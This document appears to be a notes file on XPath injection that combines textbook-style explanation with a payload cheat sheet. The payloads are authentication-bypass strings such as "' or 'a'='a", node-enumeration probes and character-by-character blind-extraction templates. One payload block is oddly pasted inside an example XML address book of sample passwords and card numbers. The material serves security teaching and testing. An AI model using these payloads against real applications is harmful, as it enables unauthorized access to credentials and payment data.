#### XPATH
Injecting into XPath
====================

The XML Path Language (XPath) is an interpreted language used to navigate
around XML documents and to retrieve data from within them. In most cases,
an XPath expression represents a sequence of steps that is required to navigate
from one node of a document to another.
Where web applications store data within XML documents, they may use
XPath to access the data in response to user-supplied input. If this input is
inserted into the XPath query without any fi ltering or sanitization, an attacker
may be able to manipulate the query to interfere with the application's logic or
retrieve data for which she is not authorized.
XML documents generally are not a preferred vehicle for storing enterprise data.
However, they are frequently used to store application confi guration data that may
be retrieved on the basis of user input. They may also be used by smaller applications
to persist simple information such as user credentials, roles, and privileges.

<addressBook>
	<address>
		<firstName>William</firstName>
		<surname>Gates</surname>
		<password>MSRocks!</password>
		<email>billyg@microsoft.com</email>
		<ccard>5130 8190 3282 3515</ccard>
	</address>
	<address>
		<firstName>Chris</firstName>
		<surname>Dawes</surname>
		<password>secret</password>
		<email>cdawes@craftnet.de</email>
		<ccard>3981 2491 3242 3121</ccard>
	</address>
	<address>
		<firstName>James</firstName>
		<surname>Hunter</surname>
		<password>letmein</password>
		<email>james.hunter@pookmail.com</email>
		<ccard>8113 5320 8014 3313</ccard>
	</address>

XPATH injection
XPath Injection is an attack technique used to exploit applications  that construct XPath (XML Path Language) queries from user-supplied  input to query or navigate XML documents.

Exploitation
Similar to SQL : "string(//user[name/text()='" +vuln_var1+ "' and password/text()=â€™" +vuln_var1+ "']/account/text())"
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
/
//
//*
*/*
@*
count(/child::node())
x' or name()='username' or 'x'='y
' and count(/*)=1 and '1'='1
' and count(/@*)=1 and '1'='1
' and count(/comment())=1 and '1'='1
Blind Exploitation
1. Size of a string
and string-length(account)=SIZE_INT

2. Extract a character
substring(//user[userid=5]/username,2,1)=CHAR_HERE
substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)


======================================================


</addressBook>

An XPath query to retrieve all e-mail addresses would look like this:
//address/email/text()

A query to return all the details of the user Dawes would look like this:
//address[surname/text()='Dawes']

In some applications, user-supplied data may be embedded directly into
XPath queries, and the results of the query may be returned in the application's
response or used to determine some aspect of the application's behavior.

Subverting Application Logic
Consider an application function that retrieves a user's stored credit card number
based on a username and password. The following XPath query effectively
verifi es the user-supplied credentials and retrieves the relevant user's credit
card number:

//address[surname/text()='Dawes' and password/text()='secret']/ccard/text()

In this case, an attacker may be able to subvert the application's query in an
identical way to a SQL injection fl aw. For example, supplying a password with
this value:

' or 'a'='a

results in the following XPath query, which retrieves the credit card details of
all users:

//address[surname/text()='Dawes' and password/text()='' or 'a'='a']/
ccard/text()


Blind XPATH Injection:
======================

For example, you can use the substring technique described previously to
extract the name of the current node's parent by supplying a series of passwords
of this form:
' or substring(name(parent::*[position()=1]),1,1)= 'a
This input generates results, because the fi rst letter of the address node is a.
Moving on to the second letter, you can confi rm that this is d by supplying the
following passwords, the last of which generates results:

' or substring(name(parent::*[position()=1]),2,1)='a
' or substring(name(parent::*[position()=1]),2,1)='b
' or substring(name(parent::*[position()=1]),2,1)='c
' or substring(name(parent::*[position()=1]),2,1)='d

Exemple:

//address[position()=3]/child::node()[position()=4]/text()
//address[position()=3]/child::node()[position()=6]/text()


